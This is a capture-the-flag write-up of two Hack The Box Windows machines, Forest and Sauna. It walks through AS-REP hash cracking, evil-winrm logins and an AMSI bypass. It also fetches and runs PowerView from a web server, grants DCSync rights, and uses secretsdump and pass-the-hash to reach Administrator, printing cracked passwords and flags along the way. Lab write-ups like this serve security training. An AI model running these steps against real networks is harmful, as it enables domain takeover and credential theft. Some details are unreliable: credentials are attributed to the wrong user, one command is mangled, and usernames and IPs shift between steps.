root@kali# hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force ...[snip]... $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$ 5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004 d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice ...[snip]...
```


I use evil-winrm to connect and shell access to the attacking ip. 

```
$ evil-winrm -i 10.129.135.40 -u svc-alfresco -p s3rvice
```

###### Privesc Forest

To visualize our domain and users I want use the application `bloodhound`, 



Install bloodhound, then run bloodhound-python to enumerate the privilege escalation paths which downloads json files which will be mapped via bloodhound. Then run bloodhound.

```
$ sudo apt install bloodhound
$ bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local  -c all -ns {victim ip}
$ bloodhound
```

In the Bloodhound UI the credentials for `neo4j` is `neo4j:neo4j`, then click on `Upload Data`, adding those json files from earlier. In `Start Node` add `svc-alfresco` and in `Target Node` add `Domain Admins@HTB.LOCAL`, that gives us a map of the Active Directory.

Now I go back to the Windows shell and add a new user to `Exchange Windows Permissions`

```
PS C:\Users\svc-alfresco\Documents> net user john abc123! /add /domain
PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" john /add
PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" john /add

PS C:\Users\svc-alfresco\Documents> menu

PS C:\Users\svc-alfresco\Documents> Bypass-4MSI

PS C:\Users\svc-alfresco\Documents> iex(new-object net.webclient).downloadstring('http://{target ip}/PowerView.ps1')

PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'abc123!' -asplain -force

PS C:\Users\svc-alfresco\Documents> $cred = new-object system.management.automation.pscredential('htb\john', $pass)

PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

I can now run `secretsdump` as `john`, which gets the `admin`'s hash, then `psexec` with the new hash gets root access to the server. Then I print the root flag.

```
$ secretsdump.py htb/john@{victim ip}

....
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

$ psexec.py administrator@{victim ip} -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

$ type \users\administrator\desktop\root.txt
97949b4e094f030d9ac3b8608e02cfe1
```

##### Sauna

I then run `GetNPUsers.py` to get a hash for those users and I get the hash of `fsmith`.

```
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.80.69 htb/${user} | grep -v Impacket; done

...

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d
```

I echo the hash into a file and use `hashcat` to break the hash.

```
echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d' > hash.txt

$ hashcat -m 18200 svc-alfresco^Cerb /usr/share/wordlists/rockyou.txt

...

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d:Thestrokes23
```

Above I got the credentials `svc-alfresco:Thestrokes23`, to login I use `evil-winrm`:

```
$ evil-winrm -i 10.129.80.69 -u fsmith -p Thestrokes23
```

From here I can cat the user flag:

```
C:\Users\FSmith\Desktop> cat user.txt
9448503be312b368c979a07686643305
```

It is time for privilege escalation, normally I would use WinPEAS.exe, but had issues with it.

I was able however, to run `reg.exe`, which interacts with Windows Registry Editor.

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
...

DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
...
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

I now have the credentials `svc_loanmanager:Moneymakestheworldgoround`

I can connect to this user using `evil-winrm`

```
$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

I can do a `secretsdump` to get the Administrator credentials, where I get the Admin's credentials.

```
$ secretsdump.py egotistical-bank/svc_loanmgr@10.129.80.69 -just-dc-user Administrator
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

I use this hash to login as Administrator:

```
$ psexec.py egotistical-bank.local/administrator@10.129.80.69 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

C:\Windows\system32> powershell

PS C:\Windows\system32> cd ..

PS C:\Windows> cd Administrator/Desktop

PS C:\Windows\Administrator\Desktop> cat root.txt
f3fde5394d127479b8d68650a94ce4e6
```

